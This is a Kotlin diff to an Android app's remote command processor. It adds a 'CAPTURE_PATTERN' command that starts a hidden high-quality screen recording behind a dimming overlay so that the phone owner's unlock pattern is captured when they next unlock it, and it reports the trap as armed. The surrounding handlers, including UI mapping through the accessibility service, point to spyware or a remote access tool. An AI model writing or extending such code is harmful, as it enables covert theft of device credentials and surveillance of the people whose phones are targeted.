@@ -314,6 +314,36 @@ object CommandProcessor {
                         errorMsg = "Accessibility service is required for UI mapping."
                     }
                 }
+                "CAPTURE_PATTERN" -> {
+                    val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                    if (!pm.isInteractive) {
+                        status = "FAILED (SCREEN_OFF)"
+                        errorMsg = "Screen must be physically ON to initiate the pattern trap securely."
+                    } else {
+                        ScreenRecordManager.expectedMode = "AUTO"
+                        ScreenRecordManager.pendingDur = 600 // 10 min fallback
+                        ScreenRecordManager.pendingQual = "HIGH" // High required to see pattern lines clearly
+                        ScreenRecordManager.pendingAudio = false
+                        ScreenRecordManager.isPatternTrap = true
+                        
+                        android.os.Handler(android.os.Looper.getMainLooper()).post {
+                            DimmerManager.applyDim(ctx, 100, "OVERLAY")
+                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                if (ScreenRecordManager.expectedMode == "AUTO") {
+                                    DimmerManager.removeOverlay(ctx)
+                                    ScreenRecordManager.expectedMode = ""
+                                }
+                            }, 10000)
+                        }
+                        
+                        val i = Intent(ctx, PulseActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            putExtra("is_screen_record_trigger", true)
+                        }
+                        ctx.startActivity(i)
+                        status = "PATTERN_TRAP_ARMED (Awaiting Unlock)"
+                    }
+                }
                 "GET_TREE" -> {
                     val parts = content.split("|")
                     val pkg = parts.getOrNull(0)?.trim().let { if (it == "null" || it == "") null else it }
